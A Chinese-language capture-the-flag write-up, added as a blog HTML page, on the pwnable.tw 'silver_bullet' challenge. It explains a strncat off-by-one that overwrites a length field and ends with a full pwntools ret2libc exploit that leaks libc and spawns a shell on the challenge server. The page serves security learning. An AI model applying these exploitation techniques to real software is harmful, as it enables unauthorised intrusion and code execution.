@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwnable.tw,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="这道题在最后利用的时候出现了一些问题，还是学弟一步一步的教通的，学弟太强了，向学弟学习。  分析程序基本信息1234567v1cky@ubuntu:~/Desktop/pwnable/silver_bullet$ checksec silver_bullet.dms[*] &apos;/home/v1cky/Desktop/pwnable/silver_bullet/silver_bullet.dms&apos;">
+<meta name="keywords" content="pwnable.tw">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw silver_bullet writeup">
+<meta property="og:url" content="https://v1ckydxp.github.io/archives/2019/05/09/pwnable.tw_silver_bullet_writeup/index.html">
+<meta property="og:site_name" content="v1cky&#39;blog">
+<meta property="og:description" content="这道题在最后利用的时候出现了一些问题，还是学弟一步一步的教通的，学弟太强了，向学弟学习。  分析程序基本信息1234567v1cky@ubuntu:~/Desktop/pwnable/silver_bullet$ checksec silver_bullet.dms[*] &apos;/home/v1cky/Desktop/pwnable/silver_bullet/silver_bullet.dms&apos;">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-07-11T00:59:38.578Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwnable.tw silver_bullet writeup">
+<meta name="twitter:description" content="这道题在最后利用的时候出现了一些问题，还是学弟一步一步的教通的，学弟太强了，向学弟学习。  分析程序基本信息1234567v1cky@ubuntu:~/Desktop/pwnable/silver_bullet$ checksec silver_bullet.dms[*] &apos;/home/v1cky/Desktop/pwnable/silver_bullet/silver_bullet.dms&apos;">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://v1ckydxp.github.io/archives/2019/05/09/pwnable.tw_silver_bullet_writeup/">
+
+
+
+
+
+  <title>pwnable.tw silver_bullet writeup | v1cky'blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">v1cky'blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">few words,many deeds!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://v1ckydxp.github.io/archives/2019/05/09/pwnable.tw_silver_bullet_writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="v1cky01dxp">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="v1cky'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pwnable.tw silver_bullet writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-05-09T21:45:00+08:00">
+                2019-05-09
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-07-11T08:59:38+08:00">
+                2019-07-11
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/二进制/" itemprop="url" rel="index">
+                    <span itemprop="name">二进制</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  6
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>这道题在最后利用的时候出现了一些问题，还是学弟一步一步的教通的，学弟太强了，向学弟学习。</p>
+</blockquote>
+<h3 id="分析程序基本信息"><a href="#分析程序基本信息" class="headerlink" title="分析程序基本信息"></a>分析程序基本信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v1cky@ubuntu:~/Desktop/pwnable/silver_bullet$ checksec silver_bullet.dms</span><br><span class="line">[*] '/home/v1cky/Desktop/pwnable/silver_bullet/silver_bullet.dms'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>开启了栈不可执行保护，猜测可能是存在栈溢出，没有canary保护，没有开启地址随机化，32位程序</p>
+</blockquote>
+<h3 id="IDA分析程序逻辑"><a href="#IDA分析程序逻辑" class="headerlink" title="IDA分析程序逻辑"></a>IDA分析程序逻辑</h3><blockquote>
+<p>程序的主要功能包括创建bullet，追加bullet的description，beat。</p>
+</blockquote>
+<h4 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct bullet&#123;</span><br><span class="line">	char des[0x30];</span><br><span class="line">	int len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="create-bullet"><a href="#create-bullet" class="headerlink" title="create_bullet"></a>create_bullet</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">create_bullet</span><span class="params">(bullet *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> power; <span class="comment">// ST08_4</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( s-&gt;des[<span class="number">0</span>] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You have been created the Bullet !"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me your description of bullet :"</span>);</span><br><span class="line">  read_input(s, <span class="number">0x30</span>u);</span><br><span class="line">  power = <span class="built_in">strlen</span>(s-&gt;des);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your power is : %u\n"</span>, power);</span><br><span class="line">  s-&gt;len = power;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Good luck !!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>主要作用是将输入的des保存在bullet结构体的des数组里面，长度限制在48字节。并将长度保存在len变量中。</p>
+</blockquote>
+<h4 id="read-input"><a href="#read-input" class="headerlink" title="read_input"></a>read_input</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">cdecl <span class="title">read_input</span><span class="params">(<span class="keyword">void</span> *buf, <span class="keyword">size_t</span> nbytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> v3; <span class="comment">// [esp+0h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = read(<span class="number">0</span>, buf, nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"read error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *((_BYTE *)buf + v3 - <span class="number">1</span>) == <span class="string">'\n'</span> )       <span class="comment">// 判断字符串最后是不是换行符，如果是将换行符替换成0</span></span><br><span class="line">    *((_BYTE *)buf + v3 - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v3;                                    <span class="comment">// read函数不会自动在字符串末尾加上结束符</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>读取指定长度的字符串，由于read函数不会自动在字符串末尾加上结束符，并且只是对数组的最后一个字节判断了是不是换行符，如果是就改成字符串结束符。这里为下面的powerup函数拼接字符串埋下了隐患。</p>
+</blockquote>
+<h4 id="powerup"><a href="#powerup" class="headerlink" title="powerup"></a>powerup</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">power_up</span><span class="params">(bullet *dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> newlen; <span class="comment">// [esp+30h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  newlen = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !dest-&gt;des[<span class="number">0</span>] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You need create the bullet first !"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dest-&gt;len &gt; <span class="number">0x2F</span>u )                      <span class="comment">// 每个bullet的des不能超过47</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You can't power up any more !"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me your another description of bullet :"</span>);</span><br><span class="line">  read_input(&amp;s, <span class="number">48</span> - dest-&gt;len);  <span class="comment">// 判断剩余能输入的des的字节数</span></span><br><span class="line">  <span class="built_in">strncat</span>(dest-&gt;des, &amp;s, <span class="number">48</span> - dest-&gt;len);  <span class="comment">// strncat会将dest字符串的'\0'覆盖掉，拼接之后会在字符串末尾自动加'\0'</span></span><br><span class="line">  newlen = <span class="built_in">strlen</span>(&amp;s) + dest-&gt;len; </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your new power is : %u\n"</span>, newlen);</span><br><span class="line">  dest-&gt;len = newlen;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Enjoy it !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>strncat()处存在漏洞，strncat在拼接字符串结束后会在dest后面自动加上结束符。如果此时des数组已经保存了48个字符，那么strncat会在des[48]处也就是len的位置加上\x00从而覆盖len。若创建的时候输入des为”a”*47，下一次powerup的时候des输入”b”，那么执行完newlen = strlen(&amp;s) + dest-&gt;len;   之后newlen的值为1，就还可以进行powerup。这里就可以进行覆盖返回值，rop等一系列操作。</p>
+</blockquote>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><blockquote>
+<ol>
+<li>覆盖的返回函数的地址是main函数中的返回地址，不是power_up函数的返回地址，因为结构体为ebp+8，power_up函数的返回地址存与ebp+4，所以不能会覆盖到power_up函数的地址。</li>
+<li>由于在main函数中之后beat win之后才能return。所以要将length的值覆盖足够大，才能返回，从而跳转到puts函数，并输出puts函数的实际地址。</li>
+<li>所以泄露libc地址的顺序是create_bullet(‘a’*0x2f) —&gt; power_up(‘b’) —&gt; power_up(\xff\xff\xff+p32(0xdeadbeef) + p32(puts_plt) + p32(main_addr) + p32(puts_got))—&gt;beat()</li>
+<li>getshell的利用顺序是create_bullet(‘a’*0x2f) —&gt; power_up(‘b’) —&gt; power_up(\xff\xff\xff+p32(0xdeadbeef) + p32(system) + p32(main_addr) + p32(binsh))—&gt;beat()</li>
+</ol>
+</blockquote>
+<blockquote>
+<p>题目提供了libc文件，要泄露libc地址。思路是首先利用strncat处的漏洞覆盖len，之后再次进行powerup覆盖返回地址为put.plt的地址；具体的payload组织为：payload  = “b”*(0xt34-len(des)) + “cccc”+p32(put_plt)+p32(main)+p32(put_got)。</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">08048874</span> ; <span class="keyword">int</span> __<span class="function">cdecl <span class="title">power_up</span><span class="params">(bullet *dest)</span></span></span><br><span class="line">.text:08048874                 public power_up</span><br><span class="line">.text:<span class="number">08048874</span> power_up        proc near               ; CODE XREF: main+<span class="number">69</span>↓p</span><br><span class="line">.text:<span class="number">08048874</span></span><br><span class="line">.text:<span class="number">08048874</span> s               = byte ptr <span class="number">-34</span>h</span><br><span class="line">.text:<span class="number">08048874</span> newlen          = dword ptr <span class="number">-4</span></span><br><span class="line">.text:<span class="number">08048874</span> dest            = dword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">08048874</span></span><br><span class="line">.text:<span class="number">08048874</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">08048874</span>                 push    ebp</span><br><span class="line">.text:<span class="number">08048875</span>                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">08048877</span>                 sub     esp, <span class="number">34</span>h</span><br><span class="line">.text:<span class="number">0804887</span>A                 mov     [ebp+newlen], <span class="number">0</span></span><br><span class="line">.text:<span class="number">08048881</span>                 push    <span class="number">30</span>h             ; n</span><br><span class="line">.text:<span class="number">08048883</span>                 push    <span class="number">0</span>               ; c</span><br><span class="line">.text:<span class="number">08048885</span>                 lea     eax, [ebp+s]</span><br><span class="line">.text:<span class="number">08048888</span>                 push    eax             ; s</span><br><span class="line">.text:<span class="number">08048889</span>                 call    <span class="built_in">memset</span></span><br><span class="line">.text:<span class="number">0804888</span>E                 add     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">08048891</span>                 mov     eax, [ebp+dest]</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>dest结构体是最终输入存放的地址，位于ebp+8的位置，所以输入的字符串不能覆盖到powerup函数的返回地址，只能覆盖它的上一层的函数的地址即main函数的返回地址。但是main只有在beat成功之后才会返回，所以第二次调用powerup的时候讲length覆盖为FFFFFF01，比7FFFFFFF大。</p>
+</blockquote>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">elf = ELF(<span class="string">'./silver_bullet.dms'</span>)</span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc_elf = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./silver_bullet.dms'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc_elf = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10103</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x080488FB')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_bullet</span><span class="params">(des)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Give me your description of bullet :'</span>)</span><br><span class="line">    p.sendline(des)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">power_up</span><span class="params">(des)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Give me your another description of bullet :'</span>)</span><br><span class="line">    p.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">beat</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    create_bullet(<span class="string">'a'</span>*<span class="number">0x2f</span>)</span><br><span class="line">    power_up(<span class="string">'b'</span>*<span class="number">0x1</span>)</span><br><span class="line">    payload = <span class="string">"\xff"</span>*<span class="number">3</span>+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    payload += p32(elf.plt[<span class="string">'puts'</span>]) + p32(elf.symbols[<span class="string">'main'</span>]) + p32(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">    payload = payload.ljust(<span class="number">0x2f</span>,<span class="string">'a'</span>)</span><br><span class="line">    power_up(payload)</span><br><span class="line">    beat()</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'win !!\n'</span>)</span><br><span class="line">    puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">print</span> hex(puts_addr)</span><br><span class="line">    libcbase_addr = puts_addr - libc_elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    <span class="keyword">print</span> hex(libcbase_addr)</span><br><span class="line">    system_addr = libc_elf.symbols[<span class="string">'system'</span>] + libcbase_addr</span><br><span class="line">    <span class="keyword">print</span> hex(system_addr)</span><br><span class="line">    binsh_addr = next(libc_elf.search(<span class="string">'/bin/sh'</span>)) + libcbase_addr</span><br><span class="line">    create_bullet(<span class="string">'a'</span>*<span class="number">0x2f</span>)</span><br><span class="line">    power_up(<span class="string">'b'</span>)</span><br><span class="line"></span><br><span class="line">    payload1 = <span class="string">"\xff"</span>*<span class="number">3</span> + p32(<span class="number">0xdeafbeef</span>)</span><br><span class="line">    payload1 += p32(system_addr) + p32(elf.symbols[<span class="string">'main'</span>]) + p32(binsh_addr)</span><br><span class="line">    payload1 = payload1.ljust(<span class="number">0x2f</span>,<span class="string">'a'</span>)</span><br><span class="line">    power_up(payload1)</span><br><span class="line"></span><br><span class="line">    beat()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    v1cky01dxp
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="https://v1ckydxp.github.io/archives/2019/05/09/pwnable.tw_silver_bullet_writeup/" title="pwnable.tw silver_bullet writeup">https://v1ckydxp.github.io/archives/2019/05/09/pwnable.tw_silver_bullet_writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://v1ckydxp.github.io" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwnable-tw/" rel="tag"># pwnable.tw</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/08/pwnable.tw_death_note_writeup/" rel="next" title="pwnable.tw death_note writeup">
+                <i class="fa fa-chevron-left"></i> pwnable.tw death_note writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/24/ 2014_hitcon_stkof-writeup/" rel="prev" title="2014_hitcon_stkof writeup">
+                2014_hitcon_stkof writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">v1cky01dxp</p>
+	      <img class="site-author-image" itemprop="image" src="/images/head.jpeg" alt="v1cky01dxp">
+	      <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">16</span>
